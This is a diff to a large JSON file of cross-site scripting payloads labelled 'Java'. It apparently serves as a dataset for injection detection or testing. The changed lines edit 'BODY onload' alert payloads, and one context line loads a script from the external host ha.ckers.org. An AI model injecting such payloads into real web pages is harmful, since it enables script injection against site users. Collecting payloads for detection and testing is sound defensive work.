@@ -5639,7 +5639,7 @@
         "category": "Java"
     },
     {
-        "inputField": "<BODY onload!#$%%&()*~+-_.,:;?@[/|\\]^`=javascript:alert(1)>",
+        "inputField": "<BODY onload!#$%%&()*~+-_.,:;?@{/|\\}^`=javascript:alert(1)>",
         "category": "Java"
     },
     {
@@ -5975,9 +5975,9 @@
         "category": "Java"
     },
     {
-        "inputField": "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
-        "category": "Java"
-    },
+    	  "inputField": "<BODY onload!#$%&()*~+-_.,:;?@[\\]/|\\]^`=alert(\"XSS\")>",
+    	  "category": "Java"
+	 },
     {
         "inputField": "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
         "category": "Java"
@@ -8463,7 +8463,7 @@
         "category": "Java"
     },
     {
-        "inputField": "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
+        "inputField": "<BODY onload!#$%&()*~+-_.,:;?@^`=alert(\"XSS\")>",
         "category": "Java"
     },
     {
@@ -11251,7 +11251,7 @@
         "category": "Java"
     },
     {
-        "inputField": "<BODY onload!#$%%&()*~+-_.,:;?@[/|\\]^`=javascript:alert(1)>",
+        "inputField": "<BODY onload!#$%%&()*~+-_.,:;?@[\\]/|\\]^`=javascript:alert(1)>",
         "category": "Java"
     },
     {
@@ -11587,7 +11587,7 @@
         "category": "Java"
     },
     {
-        "inputField": "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
+        "inputField": "<BODY onload!#$%&()*~+-_.,:;?@[\\]/|\\]^`=alert(\"XSS\")>",
         "category": "Java"
     },
     {
@@ -12475,7 +12475,7 @@
         "category": "Java"
     },
     {
-        "inputField": "\"><BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
+        "inputField": "\"><BODY onload!#$%&()*~+-_.,:;?@[\\]/|\\]^`=alert(\"XSS\")>",
         "category": "Java"
     },
     {
@@ -13035,7 +13035,7 @@
         "category": "Java"
     },
     {
-        "inputField": "&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\\]^`=alert(&quot;XSS&quot;)&gt;",
+        "inputField": "&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[\\]/|\\]^`=alert(&quot;XSS&quot;)&gt;",
         "category": "Java"
     },
     {
@@ -13167,7 +13167,7 @@
         "category": "Java"
     },
     {
-        "inputField": "<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.vulnerable=true;>",
+        "inputField": "<body onload!#$%&()*~+-_.,:;?@[\\]/|\\]^`=document.vulnerable=true;>",
         "category": "Java"
     },
     {
@@ -13535,7 +13535,7 @@
         "category": "Java"
     },
     {
-        "inputField": "&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\\]^`=alert(&quot;XSS&quot;)&gt;",
+        "inputField": "&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[\\]/|\\]^`=alert(&quot;XSS&quot;)&gt;",
         "category": "Java"
     },
     {
@@ -13919,7 +13919,7 @@
         "category": "Java"
     },
     {
-        "inputField": "<;BODY onload!#$%&;()*~+-_.,:;?@[/|\\]^`=alert(\";XSS\";)>;",
+        "inputField": "<;BODY onload!#$%&;()*~+-_.,:;?@[\\]/|\\]^`=alert(\";XSS\";)>;",
         "category": "Java"
     },
     {
@@ -14051,7 +14051,7 @@
         "category": "Java"
     },
     {
-        "inputField": "<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.vulnerable=true;>",
+        "inputField": "<body onload!#$%&()*~+-_.,:;?@[\\]/|\\]^`=document.vulnerable=true;>",
         "category": "Java"
     },
     {
@@ -14419,7 +14419,7 @@
         "category": "Java"
     },
     {
-        "inputField": "\";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\\]^`=alert(\";XSS\";)>;",
+        "inputField": "\";>;<;BODY onload!#$%&;()*~+-_.,:;?@[\\]/|\\]^`=alert(\";XSS\";)>;",
         "category": "Java"
     },
     {
